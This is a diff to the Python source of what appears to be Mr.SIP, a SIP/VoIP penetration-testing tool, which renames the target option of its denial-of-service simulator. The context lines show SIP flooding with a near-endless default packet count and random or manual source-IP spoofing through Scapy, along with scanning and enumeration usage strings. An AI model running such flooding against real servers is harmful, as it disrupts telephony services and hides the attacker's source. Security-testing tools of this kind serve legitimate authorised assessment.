@@ -104,7 +104,7 @@ parser.add_option("--ds", "--dos-simulator", action="store_true", dest="dos_simu
 
 NES_USAGE = "python mr.sip.py --ns --tn <IP/IP-range/network> --dp=5060"
 ENUM_USAGE = "python mr.sip.py --se --dp=5060 --fu=fromUser.txt"
-DAS_USAGE = "python mr.sip.py --ds -dm=invite -c <packet_count> --di=<target_server_IP> --dp=<server_port> -r --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt"
+DAS_USAGE = "python mr.sip.py --ds -dm=invite -c <packet_count> --tn=<target_server_IP> --dp=<server_port> -r --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt"
 
 group_NES_usage = OptionGroup(parser, "SIP-NES Usage", NES_USAGE) # "IP range format: 192.168.1.10-192.168.1.20. Output also written to ip_list.txt."
 group_ENUM_usage = OptionGroup(parser, "SIP-ENUM Usage", ENUM_USAGE) # "It reads from ip_list.txt. You can also give the target by using --di=<target_server_IP>."        
@@ -121,7 +121,7 @@ group.add_option("-i", "--ip-save-list", dest="ip_list", default="ip_list.txt", 
 group.add_option("--dm", "--dos-method", dest="dos_method", default="register", help="DoS packet type selection. options, invite, register, sip-invite, subscribe, cancel, bye or other custom method file name.")
 group.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
 group.add_option("-l", "--lib", action="store_true", dest="library", default=False, help="Use Socket library (no spoofing), default is Scapy")
-group.add_option("--di", "--destination-ip", dest="dest_ip", help="Destination SIP server IP address.")
+# group.add_option("--di", "--destination-ip", dest="dest_ip", help="Destination SIP server IP address.")
 group.add_option("--dp", "--destination-port", dest="dest_port", default=5060, help="Destination SIP server port number. Default is 5060.")
 group.add_option("-r", "--random", action="store_true", dest="random", default=False, help="Spoof IP addresses randomly.")
 group.add_option("-m", "--manual", action="store_true", dest="manual", default=False, help="Spoof IP addresses manually. If you choose manual IP usage, you have to specify a IP list via --manual-ip-list parameter.")
@@ -346,7 +346,7 @@ def dosSmilator():
          spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
          userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])
          
-         pkt= IP(dst=options.dest_ip)
+         pkt= IP(dst=options.target_network)
          client = pkt.src
          
          if options.random and not options.library:
@@ -359,7 +359,7 @@ def dosSmilator():
          if options.library:
                send_protocol = "socket"
                
-         sip = sip_packet.sip_packet(str(options.dos_method), str(options.dest_ip), str(options.dest_port), str(client), str(fromUser), str(toUser), str(userAgent), str(spUser), send_protocol)
+         sip = sip_packet.sip_packet(str(options.dos_method), str(options.target_network), str(options.dest_port), str(client), str(fromUser), str(toUser), str(userAgent), str(spUser), send_protocol)
          sip.generate_packet()
          i += 1
          utilities.printProgressBar(i,int(options.counter),"Progress: ")
@@ -368,7 +368,7 @@ def dosSmilator():
          print ("Exiting traffic generation...")
          raise SystemExit
    
-   print ("\033[31m[!] DoS simulation finished and {0} packet sent to {1}...\033[0m".format(str(i),str(options.dest_ip)))
+   print ("\033[31m[!] DoS simulation finished and {0} packet sent to {1}...\033[0m".format(str(i),str(options.target_network)))
    utilities.promisc("off",conf.iface)
 
 
